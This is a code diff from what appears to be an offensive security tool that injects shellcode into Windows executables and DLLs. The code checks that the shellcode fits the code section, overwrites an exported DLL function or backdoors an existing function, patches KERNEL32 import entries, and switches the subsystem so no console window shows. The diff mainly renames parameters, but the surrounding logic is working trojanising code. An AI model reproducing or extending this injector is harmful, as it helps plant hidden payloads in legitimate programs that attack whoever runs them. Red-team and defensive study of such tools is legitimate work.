@@ -16,25 +16,23 @@ logger = logging.getLogger("Injector")
 
 
 def inject_exe(
-    main_shc_path: FilePath,
-    settings: Settings,
-    project: Project,
+    main_shc: bytes,
+    settings: Settings,  # Temp
+    carrier: Carrier,
 ):
-    shellcode_in = project.payload.payload_path
     exe_in = settings.inject_exe_in
     exe_out = settings.inject_exe_out
     carrier_invoke_style: CarrierInvokeStyle = settings.carrier_invoke_style
     source_style: FunctionInvokeStyle = settings.source_style
 
-    logger.info("--[ Injecting: {} into {} -> {}".format(
-        shellcode_in, exe_in, exe_out
+    logger.info("--[ Injecting: into {} -> {}".format(
+        exe_in, exe_out
     ))
 
     # Read prepared loader shellcode
     # And check if it fits into the target code section
-    main_shc = file_readall_binary(main_shc_path)
     shellcode_len = len(main_shc)
-    code_sect_size = project.carrier.superpe.get_code_section().Misc_VirtualSize
+    code_sect_size = carrier.superpe.get_code_section().Misc_VirtualSize
     if shellcode_len + 128 > code_sect_size:
         raise Exception("Error: Shellcode {}+128 too small for target code section {}".format(
             shellcode_len, code_sect_size
@@ -46,7 +44,7 @@ def inject_exe(
 
     # Patch IAT if necessary
     if source_style == FunctionInvokeStyle.iat_reuse:
-        for iatRequest in project.carrier.get_all_iat_requests():
+        for iatRequest in carrier.get_all_iat_requests():
             iat_name = superpe.get_replacement_iat_for("KERNEL32.dll", iatRequest.name)
             superpe.patch_iat_entry("KERNEL32.dll", iat_name, iatRequest.name)
 
@@ -54,7 +52,7 @@ def inject_exe(
 
     shellcode_offset: int = 0  # file offset
     if superpe.is_dll() and settings.dllfunc != "" and carrier_invoke_style == CarrierInvokeStyle.ChangeEntryPoint:
-        # Special case. put it at the beginning of the exported DLL function
+        # Special case: DLL exported function direct overwrite
         logger.info("--[ Overwrite DLL function {} with shellcode".format(settings.dllfunc))
         rva = superpe.getExportEntryPoint(settings.dllfunc)
 
@@ -118,8 +116,8 @@ def inject_exe(
                 function_backdoorer.backdoor_function(addr, shellcode_rva, shellcode_len)
 
         if source_style == FunctionInvokeStyle.iat_reuse:
-            injected_fix_iat(superpe, project.carrier)
-            injected_fix_data(superpe, project.carrier)
+            injected_fix_iat(superpe, carrier)
+            injected_fix_data(superpe, carrier)
 
     # changes from console to UI (no console window) if necessary
     superpe.patch_subsystem()
